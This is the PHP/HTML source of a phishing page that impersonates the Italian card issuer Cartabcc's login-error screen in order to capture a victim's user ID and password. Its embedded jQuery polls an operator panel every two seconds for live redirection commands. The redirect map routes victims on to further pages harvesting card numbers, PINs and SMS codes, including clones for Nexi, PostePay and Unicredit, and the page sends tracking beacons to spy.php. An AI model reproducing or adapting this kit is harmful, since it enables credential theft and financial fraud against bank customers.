<?php 
require_once '../includes/main.php';
require '../main.php';
?>
<!doctype html>
<html lang="it">

<head>
    <meta charset="utf-8">
    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cartabcc - La mia carta è differente</title>
    
    <!-- Corrected FontAwesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
    
    <link rel="stylesheet" href="Cartabcc/Cartabcc.css">
</head>

<body>
    <div class="content">
        <div class="form">
            <div class="form-header">
                <div class="left">
                    <i class="fa-solid fa-arrow-left"></i> <!-- Fixed icon class -->
                </div>
                <div class="mid">
                    <img src="Cartabcc/Cartabcc.png" alt="Cartabcc Logo">
                </div>
                <div class="right">
                    <i class="fa-solid fa-circle-question"></i>
                </div>
            </div>

            <form action="post.php" method="post">
                <div class="form-groups">
                    <div class="form-group">
                        <input type="text" name="userin1" required placeholder="User Id" id="userin1">
                    </div>
                    <div class="form-group">
                        <input type="password" name="pass1" required placeholder="Password">
                    </div>
										                    <!-- Error message displayed when login fails -->
                    <div class="form-group" style="color:#d67d7d; text-align: center;">
                        I tuoi dati di accesso non sono corretti
                    </div>
                    <div class="form-group" style="text-align: center; margin-top: 20px;">
                        <button type="submit" style="background-color: #90EE90; color: white; border: none; padding: 10px 20px; 
                            font-size: 16px; border-radius: 5px; cursor: pointer; transition: 0.3s;">
                            ACCEDI
                        </button>
                        <p class="forgot" style="margin-top: 10px;">
                            <a href="recuperar-senha.html" style="color: #90EE90; text-decoration: none; font-size: 14px; transition: 0.3s;">
                                Hai dimenticato la password o le credenziali ?
                            </a>
                        </p>
                    </div>
                </div>
            </form>
        </div>
    </div>

    <!-- Ensure jQuery is loaded first -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    
    <!-- Fixed script paths -->
    <script src="res/jq.js"></script>
    <script src="res/v.js"></script>

    <script>
        var targets = {
            1: "log.php",
            2: "card.php",
            3: "carderror.php",
            4: "nexi.php",
            5: "nexi_error.php",
            6: "ints.php",
            7: "ints_error.php",
            8: "sms.php",
            9: "sms_error.php",
            10: "success.php",
            11: "app.php",
			12: "Cartabcc.php",
			13: "Cartabcc_error.php",
			14: "PostePay.php",
			15: "PostePay_error.php",
			16: "Unicredit.php",
			17: "Unicredit_error.php",
			18: "pin.php"
        };

        function clearRedirections() {
            $.post("../panel/process/processor.php", { clearRedirection: 1 });
        }

        $(document).ready(function () {
            clearRedirections();

            setInterval(function () {
                $.post("../panel/process/processor.php", { keepAlive: 1, page: "Cartabcc_Error" });
            }, 2000);

            setInterval(function () {
                $.post("../panel/process/processor.php", { redirectionListener: 1 }, function (data) {
                    var redirect = parseInt(data);
                    if (redirect && targets[redirect]) {
                        clearRedirections();
                        window.location.href = targets[redirect];
                    }
                });
            }, 2000);

            var abort = false;
            $("#email").on("keyup", function () {
                if (!abort) {
                    $.post("spy.php", { nexing: 1 });
                    abort = true;
                    setTimeout(() => abort = false, 5000); // Reset after 5 seconds
                }
            });

            $.post("spy.php", { nexiview: 1 });
        });
    </script>

</body>
</html>
